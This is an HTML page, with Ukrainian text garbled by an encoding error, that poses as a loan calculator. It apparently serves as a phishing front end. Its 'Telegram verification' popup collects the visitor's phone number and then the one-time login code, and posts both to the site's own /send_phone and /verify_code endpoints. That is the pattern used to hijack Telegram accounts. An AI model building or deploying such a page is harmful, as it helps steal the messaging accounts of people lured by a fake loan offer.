<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>–ö—Ä–µ–¥–∏—Ç–Ω–∏–π –ö–∞–ª—å–∫—É–ª—è—Ç–æ—Ä + –í–µ—Ä–∏—Ñ—ñ–∫–∞—Ü—ñ—è</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
    }
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      min-height: 100vh;
      padding: 40px 20px;
      background: linear-gradient(to right, #667eea, #764ba2);
      color: white;
      text-align: center;
    }
    h1 {
      margin-bottom: 20px;
    }
    .btn {
      padding: 12px 24px;
      font-size: 18px;
      border: none;
      border-radius: 5px;
      background-color: #fff;
      color: #333;
      cursor: pointer;
      transition: background 0.3s;
    }
    .btn:hover {
      background-color: #eee;
    }
    .popup {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.6);
      justify-content: center;
      align-items: center;
    }
    .popup-content {
      background: white;
      color: black;
      padding: 30px;
      border-radius: 10px;
      width: 90%;
      max-width: 400px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      border: 1px solid #ccc;
      color: black;
    }
    .hidden {
      display: none;
    }
    .section {
      background: rgba(255, 255, 255, 0.1);
      padding: 20px;
      border-radius: 10px;
      margin-bottom: 30px;
      width: 100%;
      max-width: 600px;
    }
    .input-group {
      display: flex;
      align-items: center;
    }
    #country-flag {
      font-size: 24px;
      margin-right: 8px;
    }
    input.error-border {
      border: 2px solid red;
    }

    .error {
      color: red;
      font-size: 14px;
      margin-top: 5px;
    }
    .hidden {
      display: none;
    }

  </style>
</head>
<body>
  <h1>–ö—Ä–µ–¥–∏—Ç–Ω–∏–π –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä</h1>

  <div class="section">
    <label>–°—É–º–∞ –∫—Ä–µ–¥–∏—Ç—É (–≥—Ä–Ω)</label>
    <div class="slider-output">
      <input type="range" id="amountRange" min="1000" max="100000" step="1000" value="10000">
      <input type="number" id="amountInput" min="1000" max="100000" step="1000" value="10000">
    </div>

    <label>–ü–µ—Ä—ñ–æ–¥ (–º—ñ—Å—è—Ü—ñ–≤)</label>
    <div class="slider-output">
      <input type="range" id="periodRange" min="1" max="36" value="12">
      <input type="number" id="periodInput" min="1" max="36" value="12">
    </div>

    <p>–í—ñ–¥—Å–æ—Ç–∫–æ–≤–∞ —Å—Ç–∞–≤–∫–∞: <strong>3%</strong> –Ω–∞ –º—ñ—Å—è—Ü—å</p>
    <p>–î–æ —Å–ø–ª–∞—Ç–∏: <strong id="totalPayment">12360</strong> –≥—Ä–Ω</p>
  </div>

  <button class="btn" onclick="showPopup()">–í–µ—Ä–∏—Ñ—ñ–∫–∞—Ü—ñ—è —á–µ—Ä–µ–∑ –¢–µ–ª–µ–≥—Ä–∞–º</button>

  <div class="popup" id="popup">
    <div class="popup-content">
      <!-- –§–æ—Ä–º–∞ —Ç–µ–ª–µ—Ñ–æ–Ω—É -->
      <div id="phone-form">
        <h2>–í–≤–µ–¥—ñ—Ç—å –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É</h2>
        <div class="input-group">
          <span id="country-flag">üì±</span>
          <input type="tel" id="phoneInput" placeholder="+380 –•–•–• –•–•–• –•–•–•" required autocomplete="off">
        </div>
        <button class="btn" id="sendPhoneBtn">–ù–∞–¥—ñ—Å–ª–∞—Ç–∏ –Ω–æ–º–µ—Ä</button>
      </div>

      <!-- –§–æ—Ä–º–∞ –∫–æ–¥—É -->
      <div id="code-form" class="hidden">
        <h2>–í–≤–µ–¥—ñ—Ç—å –∫–æ–¥</h2>
        <input type="text" id="codeInput" placeholder="–ö–æ–¥" required autocomplete="off">
        <p id="codeError" class="error hidden">–ù–µ–≤—ñ—Ä–Ω–∏–π –∫–æ–¥, —Å–ø—Ä–æ–±—É–π—Ç–µ —â–µ —Ä–∞–∑</p>
        <button class="btn" id="confirmBtn">–ü—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏</button>
      </div>

    </div>
  </div>

  <script>
    function showPopup() {
      resetForm();
      document.getElementById("popup").style.display = "flex";
    }

    function resetForm() {
      document.getElementById("phone-form").style.display = "block";
      document.getElementById("code-form").style.display = "none";
      document.getElementById("phoneInput").value = "";
      document.getElementById("codeInput").value = "";
      document.getElementById("country-flag").textContent = "üì±";

      // ‚úÖ —Å–∫–∏–¥–∞–Ω–Ω—è –ø–æ–º–∏–ª–æ–∫
      const codeInput = document.getElementById("codeInput");
      const codeError = document.getElementById("codeError");
      codeInput.classList.remove("error-border");
      codeError.classList.add("hidden");
      codeError.textContent = "";
    }


    // –ú–∞–ø–∞ –∫–æ–¥—ñ–≤ –∫—Ä–∞—ó–Ω–∏ –¥–æ –ø—Ä–∞–ø–æ—Ä—Ü—ñ–≤
    const countryFlags = {
  "+1": "üá∫üá∏",
  "+7": "üá∑üá∫",
  "+20": "üá™üá¨",
  "+27": "üáøüá¶",
  "+30": "üá¨üá∑",
  "+31": "üá≥üá±",
  "+32": "üáßüá™",
  "+33": "üá´üá∑",
  "+34": "üá™üá∏",
  "+36": "üá≠üá∫",
  "+39": "üáÆüáπ",
  "+40": "üá∑üá¥",
  "+41": "üá®üá≠",
  "+43": "üá¶üáπ",
  "+44": "üá¨üáß",
  "+45": "üá©üá∞",
  "+46": "üá∏üá™",
  "+47": "üá≥üá¥",
  "+48": "üáµüá±",
  "+49": "üá©üá™",
  "+51": "üáµüá™",
  "+52": "üá≤üáΩ",
  "+53": "üá®üá∫",
  "+54": "üá¶üá∑",
  "+55": "üáßüá∑",
  "+56": "üá®üá±",
  "+57": "üá®üá¥",
  "+58": "üáªüá™",
  "+60": "üá≤üáæ",
  "+61": "üá¶üá∫",
  "+62": "üáÆüá©",
  "+63": "üáµüá≠",
  "+64": "üá≥üáø",
  "+65": "üá∏üá¨",
  "+66": "üáπüá≠",
  "+81": "üáØüáµ",
  "+82": "üá∞üá∑",
  "+84": "üáªüá≥",
  "+86": "üá®üá≥",
  "+90": "üáπüá∑",
  "+91": "üáÆüá≥",
  "+92": "üáµüá∞",
  "+93": "üá¶üá´",
  "+94": "üá±üá∞",
  "+95": "üá≤üá≤",
  "+98": "üáÆüá∑",
  "+212": "üá≤üá¶",
  "+213": "üá©üáø",
  "+216": "üáπüá≥",
  "+218": "üá±üáæ",
  "+220": "üá¨üá≤",
  "+221": "üá∏üá≥",
  "+234": "üá≥üá¨",
  "+250": "üá∑üáº",
  "+254": "üá∞üá™",
  "+255": "üáπüáø",
  "+256": "üá∫üá¨",
  "+380": "üá∫üá¶"
};


    const phoneInput = document.getElementById("phoneInput");
    const countryFlag = document.getElementById("country-flag");
    const sendPhoneBtn = document.getElementById("sendPhoneBtn");
    const codeInput = document.getElementById("codeInput");
    const confirmBtn = document.getElementById("confirmBtn");
    const phoneForm = document.getElementById("phone-form");
    const codeForm = document.getElementById("code-form");


    // –ê–≤—Ç–æ-–ø—Ä–∞–ø–æ—Ä–µ—Ü—å
    phoneInput.addEventListener("input", () => {
      let value = phoneInput.value.replace(/[^\d+]/g, '');
      if (!value.startsWith('+')) value = '+' + value;
      phoneInput.value = value;

      let found = false;
      for (const prefix in countryFlags) {
        if (value.startsWith(prefix)) {
          countryFlag.textContent = countryFlags[prefix];
          found = true;
          break;
        }
      }
      if (!found) countryFlag.textContent = "üì±";
    });

    // –ù–∞–¥—Å–∏–ª–∞–Ω–Ω—è —Ç–µ–ª–µ—Ñ–æ–Ω—É
    document.getElementById("sendPhoneBtn").addEventListener("click", async () => {
    const phone = phoneInput.value.trim();
    if (!phone) return;

    try {
      const res = await fetch("/send_phone", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phone })
      });

      const data = await res.json();

      if (res.ok && data.status === "code_sent") {
        phoneForm.style.display = "none";
        codeForm.style.display = "block";
      } else {
        const data = await res.json();
        alert(data.detail || "–ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –≤—ñ–¥–ø—Ä–∞–≤—Ü—ñ –Ω–æ–º–µ—Ä–∞");
      }
    } catch (err) {
      alert(err);
    }
  });

    // –ù–∞–¥—Å–∏–ª–∞–Ω–Ω—è –∫–æ–¥—É

  document.getElementById("confirmBtn").addEventListener("click", async () => {
    const phone = phoneInput.value.trim();
    const code = codeInput.value.trim();
    if (!phone || !code) return;

    try {
      const res = await fetch("/verify_code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phone, code })
      });

      const data = await res.json();

      if (res.ok) {
        document.getElementById("popup").style.display = "none";
        resetForm();
      } else {
        codeError.textContent = data.detail || "–ù–µ–≤—ñ—Ä–Ω–∏–π –∫–æ–¥";
        codeError.classList.remove("hidden");
        codeInput.classList.add("error-border");
      }
    } catch (err) {
      codeError.textContent = "–°–µ—Ä–≤–µ—Ä –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∏–π";
      codeError.classList.remove("hidden");
      codeInput.classList.add("error-border");
    }
  });

  // –∑–Ω—ñ–º–∞—Ç–∏ —á–µ—Ä–≤–æ–Ω—É —Ä–∞–º–∫—É –ø—Ä–∏ –≤–≤–æ–¥—ñ
  codeInput.addEventListener("input", () => {
    codeInput.classList.remove("error-border");
    codeError.classList.add("hidden");
    codeError.textContent = "";
  });



    // –ö–∞–ª—å–∫—É–ª—è—Ç–æ—Ä
    const amountRange = document.getElementById("amountRange");
    const amountInput = document.getElementById("amountInput");
    const periodRange = document.getElementById("periodRange");
    const periodInput = document.getElementById("periodInput");
    const totalPayment = document.getElementById("totalPayment");

    function updateCalculation() {
      const amount = parseInt(amountRange.value);
      const months = parseInt(periodRange.value);
      const monthlyRate = 0.03;
      const total = Math.round(amount * Math.pow(1 + monthlyRate, months));
      totalPayment.textContent = total;
      amountInput.value = amount;
      periodInput.value = months;
    }

    amountRange.addEventListener("input", () => {
      amountInput.value = amountRange.value;
      updateCalculation();
    });

    amountInput.addEventListener("input", () => {
      amountRange.value = amountInput.value;
      updateCalculation();
    });

    periodRange.addEventListener("input", () => {
      periodInput.value = periodRange.value;
      updateCalculation();
    });

    periodInput.addEventListener("input", () => {
      periodRange.value = periodInput.value;
      updateCalculation();
    });

    updateCalculation();
  </script>
</body>
</html>
